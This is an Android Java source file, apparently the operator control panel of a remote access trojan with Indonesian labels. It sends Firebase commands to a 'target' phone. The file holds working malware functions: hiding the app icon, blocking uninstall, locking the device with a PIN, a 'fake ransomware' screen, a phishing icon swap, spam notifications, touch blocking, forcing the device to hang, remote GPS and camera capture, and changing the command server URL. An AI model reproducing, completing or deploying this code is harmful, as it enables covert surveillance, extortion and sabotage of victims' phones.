package com.paragon.control;

import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.InputType;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private StorageReference mStorage;
    private TextView tvDeviceName, tvDeviceId, tvBattery, tvStatus;
    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus;
    private TextView tvAntiUninstallText, tvNgehangStatus;
    private Switch swAntiUninstall, swFlashlight, swLockLow, swLockCustom, swHideIcon;
    private Switch swNgehang;
    private EditText etServerUrl;
    private Button btnSetServer, btnRansomware, btnGanti;
    private Button btnTemaPhising, btnVideoOverlay, btnSpamNotif, btnStuckLayar;
    private Button btnGPS, btnKamera;
    private static final int REQUEST_VIDEO = 1001;

    private ValueEventListener deviceListener;
    private ValueEventListener antiUninstallListener;
    private ValueEventListener flashlightListener;
    private ValueEventListener lockLowListener;
    private ValueEventListener lockCustomListener;
    private ValueEventListener hideIconListener;
    private ValueEventListener ngehangListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");
        mStorage = FirebaseStorage.getInstance().getReference();

        // Header
        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        tvBattery = findViewById(R.id.tvBattery);
        tvStatus = findViewById(R.id.tvStatus);
        tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
        tvNgehangStatus = findViewById(R.id.tvNgehangStatus);

        // Status text
        tvFlashlightStatus = findViewById(R.id.tvFlashlightStatus);
        tvLockLowStatus = findViewById(R.id.tvLockLowStatus);
        tvLockCustomStatus = findViewById(R.id.tvLockCustomStatus);
        tvHideIconStatus = findViewById(R.id.tvHideIconStatus);

        // Switch
        swAntiUninstall = findViewById(R.id.swAntiUninstall);
        swFlashlight = findViewById(R.id.swFlashlight);
        swLockLow = findViewById(R.id.swLockLow);
        swLockCustom = findViewById(R.id.swLockCustom);
        swHideIcon = findViewById(R.id.swHideIcon);
        swNgehang = findViewById(R.id.swNgehang);

        // Button
        btnGanti = findViewById(R.id.btnGanti);
        btnTemaPhising = findViewById(R.id.btnTemaPhising);
        btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
        btnSpamNotif = findViewById(R.id.btnSpamNotif);
        btnStuckLayar = findViewById(R.id.btnStuckLayar);
        btnGPS = findViewById(R.id.btnGPS);
        btnKamera = findViewById(R.id.btnKamera);
        btnRansomware = findViewById(R.id.btnRansomware);
        btnSetServer = findViewById(R.id.btnSetServer);
        etServerUrl = findViewById(R.id.etServerUrl);

        sendMyDeviceInfo();
        listenDeviceInfoRealtime();
        listenStatusRealtime();

        // ===== GANTI SERVER =====
        btnSetServer.setOnClickListener(v -> {
            String newUrl = etServerUrl.getText().toString().trim();
            if (!newUrl.isEmpty()) {
                mDatabase.child("serverUrl").setValue(newUrl);
                Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
                etServerUrl.setText("");
            } else {
                Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== ANTI UNINSTALL =====
        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("antiUninstall").setValue(isChecked);
            updateStatusText(tvAntiUninstallText, isChecked);
            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== NGEHANG =====
        swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("ngehang").setValue(isChecked);
            updateStatusText(tvNgehangStatus, isChecked);
            Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== GANTI =====
        btnGanti.setOnClickListener(v -> Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show());

        // ===== FLASHLIGHT =====
        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("flashlight").setValue(isChecked);
            updateStatusText(tvFlashlightStatus, isChecked);
            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== LOCK LOW =====
        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockLow").setValue(isChecked);
            updateStatusText(tvLockLowStatus, isChecked);
            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== LOCK CUSTOM V2 =====
        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                showPinDialog("lockCustom", "🔒 Lock Custom V2");
            } else {
                mDatabase.child("lockCustom").setValue(false);
                updateStatusText(tvLockCustomStatus, false);
                Toast.makeText(this, "🔓 Lock Custom OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== FAKE RANSOMWARE =====
        btnRansomware.setOnClickListener(v -> {
            showPinDialog("ransomware", "💰 Fake Ransomware");
        });

        // ===== TEMA PHISING =====
        btnTemaPhising.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("🎨 Tema Phising");
            final EditText input = new EditText(this);
            input.setHint("Masukkan URL icon baru...");
            builder.setView(input);
            builder.setPositiveButton("GANTI", (dialog, which) -> {
                String url = input.getText().toString();
                if (!url.isEmpty()) {
                    mDatabase.child("temaPhising").setValue(url);
                    Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
                }
            });
            builder.setNegativeButton("Batal", null);
            builder.show();
        });

        // ===== HIDE ICON =====
        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("hideIcon").setValue(isChecked);
            updateStatusText(tvHideIconStatus, isChecked);
            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== VIDEO OVERLAY =====
        btnVideoOverlay.setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("video/*");
            startActivityForResult(intent, REQUEST_VIDEO);
        });

        // ===== SPAM NOTIFIKASI =====
        btnSpamNotif.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("📨 Kirim Spam Notifikasi");
            final EditText input = new EditText(this);
            input.setHint("Ketik pesan spam...");
            builder.setView(input);
            builder.setPositiveButton("KIRIM", (dialog, which) -> {
                String pesan = input.getText().toString();
                if (!pesan.isEmpty()) {
                    mDatabase.child("spamNotif").setValue(pesan);
                    Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
                }
            });
            builder.setNegativeButton("Batal", null);
            builder.show();
        });

        // ===== STUCK LAYAR =====
        btnStuckLayar.setOnClickListener(v -> {
            mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
            Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
        });

        // ===== GPS =====
        btnGPS.setOnClickListener(v -> {
            mDatabase.child("command").setValue("gps");
            Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
        });

        // ===== KAMERA =====
        btnKamera.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("📸 Pilih Kamera Target");
            builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
                String command = (which == 0) ? "camera_front" : "camera_back";
                mDatabase.child("command").setValue(command);
                Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
            });
            builder.show();
        });
    }

    // ===== DIALOG PIN =====
    private void showPinDialog(String command, String title) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        input.setHint("4 digit PIN");
        input.setMaxLines(1);
        builder.setView(input);

        builder.setPositiveButton("LANJUT", (dialog, which) -> {
            String pin = input.getText().toString().trim();
            if (pin.length() == 4) {
                mDatabase.child("pin").setValue(pin);
                if (command.equals("lockCustom")) {
                    mDatabase.child("lockCustom").setValue(true);
                    updateStatusText(tvLockCustomStatus, true);
                    Toast.makeText(this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
                } else if (command.equals("ransomware")) {
                    mDatabase.child("ransomware").setValue(true);
                    Toast.makeText(this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "❌ PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
                if (command.equals("lockCustom")) {
                    swLockCustom.setChecked(false);
                }
            }
        });

        builder.setNegativeButton("Batal", (dialog, which) -> {
            if (command.equals("lockCustom")) {
                swLockCustom.setChecked(false);
                updateStatusText(tvLockCustomStatus, false);
            }
            dialog.cancel();
        });

        builder.setOnCancelListener(dialog -> {
            if (command.equals("lockCustom")) {
                swLockCustom.setChecked(false);
                updateStatusText(tvLockCustomStatus, false);
            }
        });

        builder.show();
    }

    // ===== UPDATE STATUS TEXT =====
    private void updateStatusText(TextView tv, boolean isOn) {
        tv.setText(isOn ? "ON" : "OFF");
        tv.setTextColor(isOn ? 0xFF00FF41 : 0xFFFF1744);
    }

    // ===== REAL-TIME: DATA TARGET =====
    private void listenDeviceInfoRealtime() {
        deviceListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String deviceName = snapshot.child("deviceName").getValue(String.class);
                    String deviceId = snapshot.child("deviceId").getValue(String.class);
                    Integer battery = snapshot.child("battery").getValue(Integer.class);
                    Boolean online = snapshot.child("online").getValue(Boolean.class);
                    runOnUiThread(() -> {
                        if (deviceName != null) tvDeviceName.setText(deviceName);
                        if (deviceId != null) tvDeviceId.setText(deviceId);
                        if (battery != null) tvBattery.setText(battery + "%");
                        if (online != null) {
                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                            tvStatus.setTextColor(online ? 0xFF00FF41 : 0xFFFF1744);
                        }
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("deviceInfo").addValueEventListener(deviceListener);
    }

    // ===== REAL-TIME: STATUS =====
    private void listenStatusRealtime() {
        flashlightListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        updateStatusText(tvFlashlightStatus, value);
                        swFlashlight.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("flashlight").addValueEventListener(flashlightListener);

        lockLowListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        updateStatusText(tvLockLowStatus, value);
                        swLockLow.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockLow").addValueEventListener(lockLowListener);

        lockCustomListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        updateStatusText(tvLockCustomStatus, value);
                        swLockCustom.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);

        hideIconListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        updateStatusText(tvHideIconStatus, value);
                        swHideIcon.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("hideIcon").addValueEventListener(hideIconListener);

        antiUninstallListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swAntiUninstall.setChecked(value);
                        updateStatusText(tvAntiUninstallText, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);

        ngehangListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swNgehang.setChecked(value);
                        updateStatusText(tvNgehangStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("ngehang").addValueEventListener(ngehangListener);
    }

    // ===== SEND DEVICE INFO =====
    private void sendMyDeviceInfo() {
        String deviceName = Build.MODEL;
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        int battery = getBatteryLevel();
        Map<String, Object> data = new HashMap<>();
        data.put("deviceName", deviceName);
        data.put("deviceId", deviceId);
        data.put("battery", battery);
        data.put("online", true);
        data.put("timestamp", System.currentTimeMillis());
        mDatabase.child("deviceInfo").setValue(data);
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO && resultCode == RESULT_OK && data != null) {
            Uri videoUri = data.getData();
            uploadVideoToFirebase(videoUri);
        }
    }

    private void uploadVideoToFirebase(Uri videoUri) {
        Toast.makeText(this, "📤 Uploading video...", Toast.LENGTH_SHORT).show();
        StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
        ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                mDatabase.child("videoUrl").setValue(uri.toString());
                Toast.makeText(this, "✅ Video terkirim ke target!", Toast.LENGTH_SHORT).show();
            });
        }).addOnFailureListener(e -> {
            Toast.makeText(this, "❌ Gagal upload video!", Toast.LENGTH_SHORT).show();
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (deviceListener != null) mDatabase.child("deviceInfo").removeEventListener(deviceListener);
        if (flashlightListener != null) mDatabase.child("flashlight").removeEventListener(flashlightListener);
        if (lockLowListener != null) mDatabase.child("lockLow").removeEventListener(lockLowListener);
        if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
        if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
        if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
        if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
    }
                                             }
